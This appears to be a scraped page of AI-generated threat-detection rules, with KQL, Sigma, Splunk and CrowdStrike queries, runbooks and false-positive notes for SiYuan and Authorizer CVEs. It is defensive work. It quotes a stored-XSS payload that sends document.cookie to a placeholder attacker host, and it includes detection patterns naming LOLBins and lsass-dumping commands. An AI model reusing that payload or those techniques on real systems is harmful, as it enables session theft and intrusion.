Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer). → [LLM] Vulnerable SiYuan install exposed to CVE-2026-54069 (kernel < 3.7.0)
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Web browser opening a socket to SiYuan kernel admin port 127.0.0.1:6806 · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] SiYuan renderer beaconing to the public internet (stored-XSS cookie exfil / SQL-dump relay) · Infostealer — non-browser process accessing browser cookie/login DBs
Web browser opening a socket to SiYuan kernel admin port 127.0.0.1:6806 AIExploitation High
Hunts the CVE-2026-54069 exploitation primitive: a Chrome/Chromium browser process connecting to the SiYuan kernel's loopback admin API on port 6806. Legitimately only SiYuan's own Electron renderer talks to 6806; a user browser (where a malicious/compromised extension's service worker runs) doing so is the origin-trust bypass in action. Rationale: Anchors on the two concrete constants from the advisory PoC — kernel loopback port 6806 and a browser (not siyuan.exe) as the initiating process — which is the exact shape of the chrome-extension origin bypass. Cross-checked GitLab GLAD and NVD confirming 127.0.0.1:6806 and fix in 3.7.0. Cross-checked against: • https://advisories.gitlab.com/golang/github.com/siyuan-note/siyuan/kernel/CVE-2026-54069/ • https://cve.threatint.eu/CVE/CVE-2026-54069
ATT&CKT1176 T1190
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A browser extension developer legitimately building/testing a SiYuan integration against the local kernel
  • Power-user browser bookmarklet or userscript that queries the SiYuan API on purpose
  • Security scanner / nuclei template probing localhost:6806 from a browser-based test harness
  • Another local app coincidentally reusing port 6806 while SiYuan is not installed (verify listener owner)
Suppression filter
| where InitiatingProcessFileName !in~ ("siyuan.exe")
Response runbook
1) TRIAGE: Confirm siyuan.exe owns the 6806 listener on the host and identify which browser process/PID made the connection; pull the browser's installed extension list (chrome://extensions) and note any recently updated/unknown extension IDs. 2) CONTAIN: Disable/remove the suspect extension, set a strong AccessAuthCode in SiYuan, and upgrade SiYuan to >= 3.7.0 which removes the blanket allowlist. 3) HUNT: Pivot on the same host to UC 'SiYuan renderer beaconing outbound' for cookie/data exfil, and check note content for injected <img onerror> XSS payloads via insertBlock.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemotePort == 6806
| where RemoteIP in ("127.0.0.1","::1") or RemoteIPType == "Loopback"
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","brave.exe","chromium.exe","vivaldi.exe","opera.exe")
| where InitiatingProcessAccountName !endswith "$"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Conns=count() by DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort
| order by FirstSeen desc

// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
DeviceNetworkEvents
| where TimeGenerated > ago(7d)

| where InitiatingProcessAccountName !endswith "$"

title: Browser Process Connecting to SiYuan Kernel Admin Port 6806
id: 3f9c1e2a-8b47-4d6e-9a11-2c5f7d0b4e88
description: Detects a Chrome/Chromium browser opening a loopback socket to the SiYuan kernel admin API (127.0.0.1:6806), the exploitation primitive for CVE-2026-54069 blanket chrome-extension origin trust.
references:
  - https://github.com/advisories/GHSA-hvr9-72v2-fff3
  - https://advisories.gitlab.com/golang/github.com/siyuan-note/siyuan/kernel/CVE-2026-54069/
author: SOC Detection Engineering
date: 2026/07/11
tags:
  - attack.t1176
  - attack.t1190
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    Image|endswith:
      - '\chrome.exe'
      - '\msedge.exe'
      - '\brave.exe'
      - '\chromium.exe'
      - '\vivaldi.exe'
      - '\opera.exe'
    DestinationPort: 6806
    DestinationIp:
      - '127.0.0.1'
      - '::1'
  condition: selection
level: high
source:windows.sysmon @EventID:3 @DestinationPort:6806 (@DestinationIp:127.0.0.1 OR @DestinationIp:\:\:1) @Image:(*\chrome.exe OR *\Chrome.exe OR *\msedge.exe OR *\MSEdge.exe OR *\brave.exe OR *\chromium.exe OR *\vivaldi.exe OR *\opera.exe)
#event_simpleName=NetworkConnectIP4 RemotePort=6806
| RemoteAddressIP4=/^127\./
| ContextImageFileName=/\\(chrome|msedge|brave|chromium|vivaldi|opera)\.exe$/i
| groupBy([aid, ComputerName, ContextImageFileName, RemoteAddressIP4, RemotePort], function=count())
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest_port=6806 (All_Traffic.dest="127.0.0.1" OR All_Traffic.dest="::1") (All_Traffic.process_name="chrome.exe" OR All_Traffic.process_name="msedge.exe" OR All_Traffic.process_name="brave.exe" OR All_Traffic.process_name="chromium.exe" OR All_Traffic.process_name="vivaldi.exe" OR All_Traffic.process_name="opera.exe") by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.process_name All_Traffic.user | `drop_dm_object_name(All_Traffic)` | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest_port=6806 (All_Traffic.dest="127.0.0.1" OR All_Traffic.dest="::1") (All_Traffic.process_name="chrome.exe" OR All_Traffic.process_name="msedge.exe" OR All_Traffic.process_name="brave.exe" OR All_Traffic.process_name="chromium.exe" OR All_Traffic.process_name="vivaldi.exe" OR All_Traffic.process_name="opera.exe") by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.process_name All_Traffic.user | `drop_dm_object_name(All_Traffic)` | convert ctime(firstTime) ctime(lastTime)
Vulnerable SiYuan install exposed to CVE-2026-54069 (kernel < 3.7.0) AIWeaponization High
Surfaces hosts running a SiYuan version affected by the blanket chrome-extension origin trust (fixed in 3.7.0 / go module 0.0.0-20260628153353-2d5d72223df4). This is the attack-surface exposure UC — any such host is exploitable by any installed browser extension. Rationale: Uses the exact CVE id (CVE-2026-54069) mapped by Defender/Sentinel TVM; the article + GitLab/NVD confirm the affected range (<= 3.6.5, fixed 3.7.0). A version-present finding is the cleanest, lowest-FP exposure signal for this local vuln. Cross-checked against: • https://advisories.gitlab.com/golang/github.com/siyuan-note/siyuan/kernel/CVE-2026-54069/
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Air-gapped or offline SiYuan host with no browser extensions installed (real exposure but lower risk)
  • TVM catalog lag reporting a host that has already been upgraded to 3.7.0
  • SiYuan running server-mode with a strong AccessAuthCode set (origin bypass still applies but auth partially mitigates)
Response runbook
1) TRIAGE: Confirm SiYuan version on the host and whether AccessAuthCode is empty (desktop default) vs set. 2) CONTAIN: Upgrade to SiYuan 3.7.0+, set a strong AccessAuthCode, and ensure the kernel binds only to 127.0.0.1. 3) HUNT: For each exposed host, run the 'browser→6806' UC over the last 30 days to check whether the primitive was actually exercised.

| where CveId == "CVE-2026-54069"
| project DeviceName, DeviceId, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel
| join kind=leftouter (DeviceInfo | summarize arg_max(Timestamp, OSPlatform, PublicIP, LoggedOnUsers) by DeviceId) on DeviceId
| order by DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId == "CVE-2026-54069"
| project TimeGenerated, DeviceName, DeviceId, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel
| order by DeviceName asc
SiYuan renderer beaconing to the public internet (stored-XSS cookie exfil / SQL-dump relay) AIActions on Objectives Medium
Hunts the CVE-2026-54069 exfiltration stage: the SiYuan Electron process making outbound connections to arbitrary public hosts. The advisory's stored-XSS payload (<img src=x onerror=fetch('https://attacker.../steal?data='+document.cookie)) and /api/query/sql dumps both egress from within siyuan.exe when rendered — a note app that normally only talks to its own sync cloud. Rationale: Anchors on the named binary siyuan.exe egressing to non-RFC1918/non-vendor public hosts — the observable tail of both the document.cookie exfil beacon and the /api/query/sql workspace dump described in the PoC. Hunting-tier because the destination is attacker-chosen (no fixed IOC), so it pivots on the anomalous process→internet edge. Cross-checked against: • https://github.com/advisories/GHSA-hvr9-72v2-fff3
ATT&CKT1539 T1041
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate SiYuan cloud sync / WebDAV / S3 backup to a user-configured endpoint not in the exclusion list
  • SiYuan checking for updates or fetching remote assets/images embedded in notes
  • User-configured third-party sync (e.g. self-hosted WebDAV) generating regular egress
  • Marketplace/theme downloads from SiYuan community mirrors
Suppression filter
| where RemoteUrl !endswith "siyuan.io" and RemoteUrl !endswith "liuyun.io" and RemoteUrl !endswith "b3logfile.com"
Response runbook
1) TRIAGE: Resolve the remote host/URL and check reputation; confirm it is not the user's configured sync endpoint (SiYuan Settings > Cloud). 2) CONTAIN: If unrecognized, block the destination, upgrade SiYuan to 3.7.0+, and inspect recent notes for injected <img onerror> or other HTML payloads added via insertBlock/setBlockAttrs. 3) HUNT: Correlate on the same host with the 'browser→6806' UC to establish whether an extension performed the injection, and review AccessAuthCode configuration.

| where InitiatingProcessFileName =~ "siyuan.exe"

| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Conns=count(), Ports=make_set(RemotePort,10) by DeviceName, InitiatingProcessAccountName, RemoteIP, RemoteUrl
| order by FirstSeen desc

    non-browser process touching these files is a high-fidelity signal.

author: Clankerusecase

Authorizer CVE-2026-54072: /authorize implicit-flow request with off-origin redirect_uri AIExploitation High
Hunts the core exploit request for CVE-2026-54072: a GET to Authorizer's /authorize endpoint using response_type=token or response_type=id_token whose redirect_uri host differs from the auth server's own host. Because /authorize never calls IsValidOrigin(), any off-origin redirect_uri causes access_token/id_token/refresh_token to be handed to an attacker URL. Rationale: Uses the exact vulnerable path /authorize + the two dangerous response_type values (token/id_token) named in the advisory, and the root-cause condition (redirect_uri host != request host) that IsValidOrigin() would have blocked. The host-mismatch check is the fidelity driver. Cross-checked against: • https://advisories.gitlab.com/golang/github.com/authorizerdev/authorizer/CVE-2026-54072/ • https://github.com/advisories/GHSA-x3f4-v83f-7wp2 • https://cvereports.com/reports/GHSA-X3F4-V83F-7WP2
ATT&CKT1528 T1550.001
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate single-page app registered with a redirect_uri on a different subdomain/CDN than the Authorizer host (e.g. app.corp.com redirect vs auth.corp.com host)
  • Penetration testers / Burp Suite probing the /authorize endpoint
  • Mobile clients using a custom-scheme redirect (myapp://callback) — RedirectHost resolves empty and is already filtered
  • Legacy OAuth clients still using deprecated implicit flow with a validly registered external redirect
Suppression filter
| where RedirectHost !in~ ("app.corp.com", "portal.corp.com")   // append your registered AllowedOrigins hosts to suppress known-good clients
Response runbook
1) TRIAGE: pull the full redirect_uri and RedirectHost; check WHOIS/age/reputation of the host and whether it appears in Authorizer's AllowedOrigins config. If it is a known registered client origin, downgrade. 2) CONTAIN: block the attacker RedirectHost at the proxy/WAF, and immediately revoke/rotate any tokens issued to sessions that hit this request (check /userinfo access with those tokens). Upgrade Authorizer to 0.0.0-20260409051328-bd3f5baf6d3d+. 3) HUNT: pivot on SrcIpAddr and victim SrcIpAddr for prior /graphql meta{client_id} recon and for outbound requests to RedirectHost carrying access_token= (see companion UCs).
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/authorize"
| extend DecodedUrl = url_decode(Url)
| where DecodedUrl has "response_type=token" or DecodedUrl has "response_type=id_token"
| extend RedirectUri = url_decode(extract(@"[?&]redirect_uri=([^&\s]+)", 1, Url))
| where isnotempty(RedirectUri)
| extend RedirectHost = tostring(parse_url(RedirectUri).Host)
| where isnotempty(RedirectHost) and RedirectHost != HttpHostName    // redirect target is not the auth server's own host
| project TimeGenerated, SrcIpAddr, DstHostname, HttpHostName, RedirectHost, HttpMethod, HttpStatusCode, Url, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

OAuth token exfiltration: access_token/id_token/refresh_token carried in outbound URL query (CVE-2026-54072) AIActions on Objectives High
The smoking gun for CVE-2026-54072: with response_mode=query the server 302-redirects the victim's browser to the attacker URL with tokens appended as query parameters, so the browser then issues a request to the attacker host with access_token/id_token/refresh_token in the URL. This hunts any HTTP request whose query string carries an OAuth bearer token — abnormal on the wire since tokens normally live in the URL fragment or Authorization header. Rationale: Directly targets the advisory's stated exfil mechanism ('appends access_token, id_token, and refresh_token as query parameters and issues a 302 redirect'). Anchoring on the JWT prefix ey (base64 of {") keeps FPs low and captures the tokens as they traverse the corporate egress proxy to the attacker host. Cross-checked against: • https://advisories.gitlab.com/golang/github.com/authorizerdev/authorizer/CVE-2026-54072/ • https://github.com/advisories/GHSA-x3f4-v83f-7wp2
ATT&CKT1020 T1041
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legacy SSO integrations that legitimately place tokens in the query string instead of the fragment/Authorization header
  • Password-reset or magic-link flows that embed a token in the URL
  • Internal SAML/OIDC debugging where tokens are logged with response_mode=query
  • API monitoring tools replaying token-bearing URLs
Suppression filter
| where DstHostname !in~ ("login.microsoftonline.com", "accounts.google.com", "auth.corp.com")   // known IdPs that may legitimately echo tokens
Response runbook
1) TRIAGE: extract DstHostname and confirm it is not a sanctioned IdP/SP; decode the JWT (aud/iss/exp) to identify the victim principal and token lifetime. 2) CONTAIN: revoke/rotate the leaked tokens and force re-auth for the victim; block DstHostname at proxy/WAF. Patch Authorizer to the fixed pseudo-version. 3) HUNT: search /userinfo and API access using the leaked access_token value, and back-correlate the same SrcIpAddr to the originating /authorize implicit-flow request (companion UC).
ImWebSession
| where TimeGenerated > ago(7d)
| extend DecodedUrl = url_decode(Url)
| where DecodedUrl matches regex @"[?&](access_token|id_token)=ey[A-Za-z0-9_\-]{10,}"    // JWT-shaped token in query
    or DecodedUrl matches regex @"[?&]refresh_token=[A-Za-z0-9_\-\.]{10,}"
| project TimeGenerated, SrcIpAddr, DstHostname, HttpHostName, HttpMethod, HttpStatusCode, Url, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Authorizer CVE-2026-54072 attack chain: /graphql client_id recon then implicit-flow /authorize AIReconnaissance Medium
Correlates the two-step attack chain from the PoC: an unauthenticated POST to /graphql (to pull client_id from meta{client_id}) followed within 10 minutes by an /authorize implicit-flow request with an off-origin redirect_uri from the same source. The off-origin condition distinguishes the attack from Authorizer's normal login flow, which also queries meta then hits /authorize. Rationale: Encodes the exact PoC sequence (public /graphql meta{client_id} lookup -> crafted /authorize implicit-flow link). Gating the /authorize side on an off-origin redirect_uri removes the legitimate SPA login flow, which walks the same two endpoints but redirects back to its own host. Cross-checked against: • https://advisories.gitlab.com/golang/github.com/authorizerdev/authorizer/CVE-2026-54072/ • https://github.com/advisories/GHSA-x3f4-v83f-7wp2
ATT&CKT1592.004 T1528
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Synthetic/uptime monitors that script a /graphql call then an /authorize call from a fixed IP (allowlist the monitor source)
  • Shared NAT/proxy egress IP where an unrelated legit login and a scanner collide within the window
  • Security scanners crawling both endpoints
  • QA automation exercising the OAuth flow end-to-end
Suppression filter
| where SrcIpAddr !in ("10.20.0.5")   // append synthetic-monitoring / QA egress IPs
Response runbook
1) TRIAGE: confirm the /authorize side has a genuinely off-origin RedirectHost (not just any external client); inspect the source IP's request volume and user-agent for automation. 2) CONTAIN: block the source IP and the RedirectHost at the WAF; revoke any tokens minted for sessions from that source. 3) HUNT: expand the window and look for the same SrcIpAddr enumerating multiple client_ids or hitting /userinfo with harvested tokens; check whether the malicious link was delivered via email (phishing) to internal users.
let Window = 10m;
let Recon = ImWebSession
    | where TimeGenerated > ago(7d)
    | where Url has "/graphql" and HttpMethod == "POST"
    | project ReconTime = TimeGenerated, SrcIpAddr, ReconUrl = Url;
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/authorize"
| extend DecodedUrl = url_decode(Url)
| where DecodedUrl has "response_type=token" or DecodedUrl has "response_type=id_token"
| extend RedirectHost = tostring(parse_url(url_decode(extract(@"[?&]redirect_uri=([^&\s]+)", 1, Url))).Host)
| where isnotempty(RedirectHost) and RedirectHost != HttpHostName
| join kind=inner Recon on SrcIpAddr
| where TimeGenerated between (ReconTime .. ReconTime + Window)
| project ReconTime, ExploitTime = TimeGenerated, DelaySec = datetime_diff('second', TimeGenerated, ReconTime), SrcIpAddr, HttpHostName, RedirectHost, ReconUrl, ExploitUrl = Url
| order by ExploitTime desc

Authorizer CVE-2026-54072: first-seen redirect_uri host on /authorize (novel attacker domain) AIDelivery Medium
IOC-free enrichment detection for the 'attacker-controlled URL' in CVE-2026-54072. Baselines redirect_uri hosts seen on /authorize over 30 days, then surfaces any host appearing for the first time in the last day — a novel/never-registered redirect target is the strongest signal available without a live domain-reputation feed. Rationale: Turns the advisory's 'attacker-controlled URL' into a concrete anti-join: a redirect_uri host never seen in the 30-day baseline of /authorize traffic is a candidate attacker domain. No hard-coded IOC needed, so it survives IOC rotation and complements the host-mismatch UC. Cross-checked against: • https://advisories.gitlab.com/golang/github.com/authorizerdev/authorizer/CVE-2026-54072/ • https://cvereports.com/reports/GHSA-X3F4-V83F-7WP2
ATT&CKT1598.002 T1528
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate onboarding of a new OAuth client / new registered redirect host
  • New corporate subdomain or CDN edge appearing for an existing app
  • Marketing or partner-integration redirect added recently
  • First traffic after a config or environment migration changes the redirect host
Suppression filter
| where RedirectHost !endswith "corp.com" and RedirectHost !endswith "cdn-partner.net"   // append sanctioned client origin suffixes
Response runbook
1) TRIAGE: check the novel RedirectHost against Authorizer's AllowedOrigins and change-management records; run the host through domain-reputation/WHOIS (age, cert, hosting). 2) CONTAIN: if unrecognised, block the host at the WAF and disable implicit flow (response_type=token/id_token) if not required; patch to the fixed version. 3) HUNT: correlate the sources hitting this host to prior /graphql client_id recon and to outbound token-in-query exfil to the same host (companion UCs); confirm no tokens were issued to it.
let Baseline = ImWebSession
    | where TimeGenerated between (ago(30d) .. ago(1d))
    | where Url has "/authorize"
    | extend RedirectHost = tostring(parse_url(url_decode(extract(@"[?&]redirect_uri=([^&\s]+)", 1, Url))).Host)
    | where isnotempty(RedirectHost)
    | summarize by RedirectHost;
ImWebSession
| where TimeGenerated > ago(1d)
| where Url has "/authorize"
| extend RedirectHost = tostring(parse_url(url_decode(extract(@"[?&]redirect_uri=([^&\s]+)", 1, Url))).Host)
| where isnotempty(RedirectHost)
| join kind=leftanti Baseline on RedirectHost
| summarize FirstSeen=min(TimeGenerated), Requests=count(), Sources=dcount(SrcIpAddr), SampleUrl=any(Url) by RedirectHost
| order by FirstSeen desc

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Non-SiYuan process writing synced snippet store data\snippets\conf.json
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] SiYuan Electron renderer (nodeIntegration) spawning shell/LOLBin child — XSS-to-RCE
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
SiYuan Electron renderer (nodeIntegration) spawning shell/LOLBin child — XSS-to-RCE AIExploitation High
Hunts the RCE stage of CVE-2026-54067 (and the sibling SiYuan XSS-to-RCE bugs): a stored snippet/caption/README breaks out of its HTML context and, because the renderer runs with nodeIntegration:true, calls require('child_process') to spawn a command interpreter. A Markdown note app should essentially never parent cmd.exe/powershell.exe, so this parent->child pair is high-fidelity across the whole SiYuan RCE bug class. Rationale: Anchored on InitiatingProcessFileName=siyuan.exe (the Electron main/renderer binary confirmed in the advisory as running nodeIntegration:true/contextIsolation:false) parenting a command interpreter — the observable end state of require('child_process').execSync from injected JS. Node's execSync on Windows spawns cmd.exe, making cmd.exe the highest-value child. Robust across all SiYuan XSS-to-RCE variants. Cross-checked against: • https://github.com/siyuan-note/siyuan/security/advisories/GHSA-phhp-9rm9-6gr2 • https://advisories.gitlab.com/golang/github.com/siyuan-note/siyuan/kernel/CVE-2026-44670/ • https://cve.threatint.eu/CVE/CVE-2026-54067
ATT&CKT1203 T1059.003 T1059.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • SiYuan document export to PDF/Word invoking a bundled pandoc/wkhtmltopdf helper (verify child binary is the export helper, not a shell)
  • User-configured 'open with' / external-command plugins in SiYuan that legitimately shell out
  • A power-user snippet the owner wrote themselves that intentionally calls a benign command (confirm with the user)
  • SiYuan auto-update or crash-reporter helper launched via cmd.exe wrapper
Suppression filter
| where not (ChildCmd has_any ("pandoc", "wkhtmltopdf", "--export", "SiYuan-Kernel"))
Response runbook
1) TRIAGE: Pull the child ProcessCommandLine and SHA256 — a benign export helper looks nothing like a shell one-liner. Check whether the same user recently edited a CSS/JS snippet or synced a workspace. 2) CONTAIN: Isolate the host, kill the child process tree, and revoke/rotate any SiYuan Cloud / S3 / WebDAV sync credentials for that workspace so the poisoned snippet can't re-propagate. 3) HUNT: Retrieve data/snippets/conf.json from every peer that syncs the same workspace and grep for '</style>' or 'onerror='; upgrade all SiYuan clients to >=3.7.0; sweep other hosts for siyuan.exe parenting interpreters over the last 30 days.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "siyuan.exe"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","curl.exe","certutil.exe","bitsadmin.exe","calc.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, ParentImage = InitiatingProcessFolderPath, ParentCmd = InitiatingProcessCommandLine, ChildImage = FolderPath, ChildCmd = ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where ParentProcessName endswith "\\siyuan.exe"
| where NewProcessName has_any ("\\cmd.exe","\\powershell.exe","\\pwsh.exe","\\wscript.exe","\\cscript.exe","\\mshta.exe","\\rundll32.exe","\\regsvr32.exe","\\curl.exe","\\certutil.exe","\\bitsadmin.exe","\\calc.exe")
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc
title: SiYuan Electron Renderer Spawning Command Interpreter (XSS-to-RCE)
id: 6a1f2c7e-9b4d-4e2a-8c3f-1d7b0e5a4c92
description: Detects the SiYuan Electron desktop app (nodeIntegration:true) spawning a shell or LOLBin child process, the RCE stage of CVE-2026-54067 and sibling stored-XSS-to-RCE bugs.
references:

  - https://github.com/siyuan-note/siyuan/security/advisories/GHSA-phhp-9rm9-6gr2
author: SOC Detection Engineering
date: 2026/07/10
tags:
  - attack.t1203
  - attack.t1059.003
  - attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\siyuan.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'

      - '\curl.exe'
      - '\certutil.exe'
      - '\bitsadmin.exe'
      - '\calc.exe'
  condition: selection
level: high
source:windows.sysmon @EventID:1 @ParentImage:(*\\siyuan.exe OR *\\SiYuan.exe) @Image:(*\\cmd.exe OR *\\Cmd.exe OR *\\powershell.exe OR *\\PowerShell.exe OR *\\pwsh.exe OR *\\mshta.exe OR *\\MSHTA.EXE OR *\\wscript.exe OR *\\cscript.exe OR *\\rundll32.exe OR *\\RegSvr32.exe OR *\\regsvr32.exe OR *\\curl.exe OR *\\certutil.exe OR *\\bitsadmin.exe)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/siyuan\.exe/i
| ImageFileName=/\\(cmd|powershell|pwsh|mshta|wscript|cscript|rundll32|regsvr32|curl|certutil|bitsadmin|calc)\.exe$/i
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name="siyuan.exe" AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","curl.exe","certutil.exe","bitsadmin.exe","calc.exe","conhost.exe") by Processes.dest Processes.user Processes.parent_process Processes.parent_process_name Processes.process Processes.process_name Processes.process_id | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name="siyuan.exe" AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","curl.exe","certutil.exe","bitsadmin.exe","calc.exe","conhost.exe") by Processes.dest Processes.user Processes.parent_process Processes.parent_process_name Processes.process Processes.process_name Processes.process_id | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime
Non-SiYuan process writing synced snippet store data\snippets\conf.json AIDelivery Medium
Hunts the plant/delivery stage of CVE-2026-54067: the malicious CSS snippet is stored in the workspace file data/snippets/conf.json, which syncs to every peer. When a process OTHER than the SiYuan kernel writes that file — e.g. a Dropbox/Syncthing/Google Drive sync client, a text editor, or a shared-drive process — it indicates the snippet store was tampered with out-of-band, exactly the 'workspace-write compromise via shared filesystem' vector the advisory calls out. Rationale: Uses the exact storage path from the advisory (data/snippets/conf.json, referenced at kernel/model/repository.go:1748,1798) and excludes the legitimate writer (the SiYuan kernel). A write by a sync client or editor is the out-of-band tamper path the advisory enumerates (Dropbox/Syncthing/network share/git). Cross-checked against: • https://cve.threatint.eu/CVE/CVE-2026-54067 • https://advisories.gitlab.com/golang/github.com/siyuan-note/siyuan/kernel/CVE-2026-44670/
ATT&CKT1080 T1195
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Dropbox.exe / SyncthingTray.exe / googledrivefs.exe legitimately syncing a workspace whose owner edited snippets on another device (benign but the exact tamper vector — inspect the resulting content)
  • A backup agent (Veeam, Duplicati, Acronis) reading/rewriting the workspace folder
  • User editing conf.json directly in VS Code / Notepad++ during troubleshooting
  • Git client (git.exe) pulling a workspace tracked in version control
  • Antivirus/EDR quarantine-and-restore touching the file
Suppression filter
| where InitiatingProcessFileName !in~ ("veeam.backup.shell.exe","duplicati.exe","backup.exe") and InitiatingProcessFileName !endswith "git.exe"
Response runbook
1) TRIAGE: Open the written data/snippets/conf.json and grep for '</style>', 'onerror=', '<img', or 'child_process' — a benign sync writes normal CSS/JS. Note the writing process and account. 2) CONTAIN: If payload strings are present, quarantine the workspace, block sync (pause Dropbox/Syncthing, revoke WebDAV/S3 creds), and prevent SiYuan from loading the poisoned snippet until cleaned. 3) HUNT: Enumerate every device syncing the same workspace and check for the same conf.json write; pivot to UC #1 (siyuan.exe spawning a shell) on those hosts to see if RCE already fired; confirm all clients are >=3.7.0.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FolderPath has @"\data\snippets\" and FileName =~ "conf.json"
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where InitiatingProcessFileName !in~ ("siyuan.exe","siyuan-kernel.exe","kernel.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FolderPath, FileName, ActionType
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFilePath has @"\data\snippets\" and TargetFileName =~ "conf.json"
| where EventType in ("FileCreated","FileModified","FileRenamed")
| where not(ActingProcessName has "siyuan")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, EventType
| order by TimeGenerated desc

Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

| where EventType in ("FileRenamed","FileModified")

| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
